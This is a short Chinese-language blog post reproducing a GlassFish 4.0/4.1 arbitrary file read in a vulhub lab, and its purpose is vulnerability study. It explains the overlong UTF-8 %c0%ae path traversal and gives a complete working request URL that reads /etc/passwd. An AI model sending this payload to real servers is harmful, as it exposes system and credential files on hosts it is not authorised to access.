---
layout: post
title: GlassFish任意文件读取
tags: GlassFish
categories: 任意文件读取
---

# GlassFish 任意文件读取漏洞

## 漏洞描述

GlassFish 是一款用于构建 Java EE的应用服务组件。java语言中会把%c0%ae解析为\uC0AE，最后转义为ASCCII字符的.（点）。利用%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/来向上跳转，达到目录穿越、任意文件读取的效果。

## 漏洞复现

首先部署是使用的GitHub中的[vulhub](!https://github.com/vulhub/vulhub.git)项目docker一键部署的。
服务启动后访问`http://your-ip:4848`可以看到GlassFish管理页面

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/GlassFish/GlassFish%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/15935956308436.jpg)

访问`https://your-ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd`，成功读取/etc/passwd内容：

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/GlassFish/GlassFish%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/15935957077679.jpg)

## 受影响的版本

4.0/4.1